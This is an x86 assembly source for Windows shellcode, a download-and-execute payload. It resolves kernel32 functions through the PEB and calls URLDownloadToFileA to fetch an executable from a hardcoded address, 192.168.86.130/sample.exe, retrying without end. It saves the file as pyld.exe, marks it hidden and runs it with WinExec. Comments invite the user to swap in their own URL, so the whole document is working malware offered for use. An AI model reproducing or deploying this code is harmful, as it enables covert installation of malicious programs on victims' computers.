section .text
    global _start
_start:
 
xor ecx,ecx
mov eax,[fs:ecx+0x30] ;Eax=PEB
mov eax,[eax+0xc] ;eax=PEB.Ldr
mov esi,[eax+0x14] ;esi=PEB.Ldr->InMemOrderModuleList
lodsd 
xchg esi,eax
lodsd
mov ecx,[eax+0x10] ;ecx=kernel32.dll base address
;------------------------------------
 
mov ebx,[ecx+0x3c] ;kernel32.dll +0x3c=DOS->e_flanew
add ebx,ecx ;ebx=PE HEADER
mov ebx,[ebx+0x78];Data_DIRECTORY->VirtualAddress
add ebx,ecx ;IMAGE_EXPORT_DIRECTORY
 
mov esi,[ebx+0x20] ;AddressOfNames
add esi,ecx
;------------------------------------------
xor edx,edx
 
count:
inc edx
lodsd
add eax,ecx
cmp dword [eax],'GetP'
jnz count
cmp dword [eax+4],'rocA'
jnz count
cmp dword [eax+8],'ddre'
jnz count
 
;---------------------------------------------
 
mov esi,[ebx+0x1c] ;AddressOfFunctions
add esi,ecx
 
mov edx,[esi+edx*4]
add edx,ecx ;edx=GetProcAddress()
 
;-----------------------------------------
 
xor esi,esi
mov esi,edx ;GetProcAddress()
mov edi,ecx ;kernel32.dll
 
;------------------------------------
;finding address of LoadLibraryA()
xor eax,eax
push eax
push 0x41797261
push 0x7262694c
push 0x64616f4c
 
push esp
push ecx
 
call edx
 
;------------------------
add esp,12
;-----------------------------
 
;LoadLibraryA("urlmon.dll")
xor ecx,ecx
 
push 0x41416c6c
mov [esp+2],byte cl
push 0x642e6e6f
push 0x6d6c7275
 
push esp
call eax
 
;-----------------------
 
add esp,12
;-----------------------
;finding address of URLDownloadToFileA()
xor ecx,ecx
push 0x42424165
mov [esp+2],byte cl
push 0x6c69466f
push 0x5464616f
push 0x6c6e776f
push 0x444c5255
 
push esp
push eax
call esi
 
;------------------------
add esp,20
push eax 
;---------------------------------------
;URLDownloadToFileA(NULL,url,save as,0,NULL)
download:
pop eax
xor ecx,ecx
push ecx
 
;-----------------------------
;change it to file url
 
push 0x6578652e
push 0x656c706d
push 0x61732f30
push 0x33312e36
push 0x382e3836
push 0x312e3239
push 0x312f2f3a
push 0x70747468
;-----------------------------------
 
 
push esp 
pop ecx ;url http://192.168.86.130/sample.exe
 
xor ebx,ebx
push ebx
 
;------------------------
;save as (no need change it.if U want to change it,do it)
push 0x6578652e
push 0x646c7970
;-------------------------------
push esp ;pyld.exe
pop ebx ;save as
 
xor edx,edx
push eax
push edx
push edx
push ebx
push ecx
push edx
 
call eax
 
;-------------------------
 
pop ecx
add esp,44
xor edx,edx
cmp eax,edx
push ecx
jnz download ;if it fails to download , retry contineusly
;------------------
pop edx
 
;-----------------------
;Finding address of SetFileAttributesA()
xor edx,edx
 
 
push 0x42424173
mov [esp+2],byte dl
push 0x65747562
push 0x69727474
push 0x41656c69
push 0x46746553
 
push esp
push edi
 
call esi
 
;--------------------------------
 
add esp,20 ;U must adjust stack or it will crash
;--------------------
;calling SetFileAttributesA("pyld.exe",FILE_ATTRIBUTE_HIDDEN) 
xor ecx,ecx
push ecx
push 0x6578652e
push 0x646c7970
 
push esp
pop ecx
 
xor edx,edx
add edx,2 ;FILE_ATTRIBUTE_HIDDEN
 
push edx
push ecx
 
call eax
 
;-------------------
 
add esp,8
;---------------------------
 
;finding address of WinExec()
xor ecx,ecx
 
push 0x41636578
mov [esp+3],byte cl
push 0x456e6957
 
push esp
push edi
call esi
 
;----------------------
 
add esp,8
 
;------------------------
;calling WinExec("pyld.exe",0)
xor ecx,ecx
push ecx
push 0x6578652e
push 0x646c7970
 
push esp
pop ecx
 
xor edx,edx
push edx
push ecx
 
call eax
;-------------------------
 
add esp,8
;-----------------------------
 
;finding address of ExitProcess()
xor ecx,ecx
push 0x41737365
mov [esp+3],byte cl
push 0x636f7250
push 0x74697845
 
push esp
push edi
 
call esi
 
;--------------
call eax
